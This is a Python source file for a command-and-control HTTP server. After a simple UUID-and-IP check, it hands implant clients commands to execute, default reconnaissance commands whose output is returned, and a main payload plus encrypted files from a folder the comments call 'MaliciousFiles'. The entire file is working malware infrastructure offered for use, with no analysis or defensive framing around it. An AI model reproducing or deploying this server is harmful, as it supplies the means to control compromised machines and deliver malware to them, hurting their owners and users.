from http.server import BaseHTTPRequestHandler, HTTPServer
import time
import urllib.request
import os
import json
import sys

#=====Vars for configuration for CnC=====
hostName = "A" # Server IP or DNS
hostPort = 0 #443/80
UUID = '' # Server side Authentication [Server-CnC]
Commands=[] # List of commands
ServerAddress = "" # Server Address - IP or DNS
Files=[] # List of files to download

scriptDir = os.getcwd() # Self directory folder

#===== Function for configuration the CnC =====
# The CnC reads the configuration from the configuration.json file
def ConfigurationServer():
    with open('configuration.json') as f:
        confFileJson = json.load(f)

        global hostName
        global hostPort
        global UUID
        global Commands
        global DefaultCommands
        global File
        global ServerAddress
        global Files

        hostName = confFileJson['Server']
        hostPort = confFileJson['Port']
        UUID = confFileJson['UUID']
        File = confFileJson['File']
        ServerAddress = confFileJson['ServerAddress']

        # Read all commands from the commands.txt file
        # Inside the file write each command as CLI terminal command
        f = open('commands.txt', 'r')
        Commands = f.read().splitlines()
        f.close()

        # Create a list of malicious files to download (Inside the MaliciousFiles folder)
        # Put the encrypted files in the MaliciousFiles folder with the original names
        # For example: powershelldll.dll -> encrypted to powershelldll.dll.enc -> put in the MaliciousFiles folder the encrypted file with the name powershelldll.dll
        for (dirpath, dirnames, filenames) in os.walk(os.path.join(scriptDir,"MaliciousFiles")):
            Files.extend(filenames)
            break

class MyServer(BaseHTTPRequestHandler):
    #GET Requests
    def do_GET(self):
        #Checks if the UUID is match (Kind of authentication)
        if (self.headers.get('UUID') == UUID and self.client_address[0]==ServerAddress):
            #Client asked for configuration
            #Client asked for list of command to execute
            if self.path.endswith("/GetCommands"):
                self.send_response(200)
                self.send_header('Content-Type', 'application/json')
                self.end_headers()
                f = open('commands.txt', 'r')
                Commands = f.read().splitlines()
                f.close()
                CommandsToSend = {"Commands": Commands}
                self.wfile.write(json.dumps(CommandsToSend).encode())
                print(json.dumps(CommandsToSend).encode())
                return
            #Client asked for list of file to download
            if self.path.endswith("/GetFiles"):
                self.send_response(200)
                self.send_header('Content-Type', 'application/json')
                self.end_headers()
                    # Create a list of malicious files to download (Inside the MaliciousFiles folder)
                    # Put the encrypted files in the MaliciousFiles folder with the original names
                    # For example: powershelldll.dll -> encrypted to powershelldll.dll.enc -> put in the MaliciousFiles folder the encrypted file with the name powershelldll.dll
                files = []
                for (dirpath, dirnames, filenames) in os.walk(os.path.join(scriptDir,"MaliciousFiles")):
                    files.extend(filenames)
                FilesToSend = {"Files": files}
                self.wfile.write(json.dumps(FilesToSend).encode())
                print(json.dumps(FilesToSend).encode())
                return
            #Client asked for list of default commands to execute (with these commands the client will send to the server the output, like: ipconfig or systeminfo)
            if self.path.endswith("/GetDefaultCommands"):
                self.send_response(200)
                self.send_header('Content-Type', 'application/json')
                self.end_headers()
                f = open('defaultcommands.txt', 'r')
                Commands = f.read().splitlines()
                f.close()
                CommandsToSend = {"DefaultCommands": Commands}
                self.wfile.write(json.dumps(CommandsToSend).encode())
                print(json.dumps(CommandsToSend).encode())
                return
            #Client asked for the main malicious file - download main file
            if self.path.endswith("/GetFile"):
                self.send_response(200)
                self.send_header('Content-type', 'application/html')
                self.send_header('FileName', File)
                abs_file_path = os.path.join(scriptDir, File)
                self.end_headers()
                with open(os.path.join(abs_file_path), 'rb') as file:
                    self.wfile.write(file.read())
                #self.wfile.write(open().read(), 'rb'))
                return
            url = self.path.split('/')
            filen = url[-1]
            if url[-2].endswith("GetAFile"):
                if (filen in Files): # For security - If the file name is in the list of files (MaliciousFiles folder contains the file name). Send the encrypted file
                    print(filen)
                    self.send_response(200)
                    self.send_header('Content-type', 'application/html')
                    self.send_header('Filename', filen)
                    self.end_headers()
                    with open(os.path.join(scriptDir,"MaliciousFiles",filen), 'rb') as file:
                        print(os.path.join(scriptDir,"MaliciousFiles",filen))
                        self.wfile.write(file.read())
                        file.close()
                        #Remove comment to delete files on server side
                        #os.remove(os.path.join(scriptDir,"MaliciousFiles",MaliciousFile))
                return


ConfigurationServer()
myServer = HTTPServer((hostName, hostPort), MyServer)
print(time.asctime(), "Server Starts - %s:%s" % (hostName, hostPort))

try:
    myServer.serve_forever()
except KeyboardInterrupt:
    pass

myServer.server_close()
print(time.asctime(), "Server Stops - %s:%s" % (hostName, hostPort))
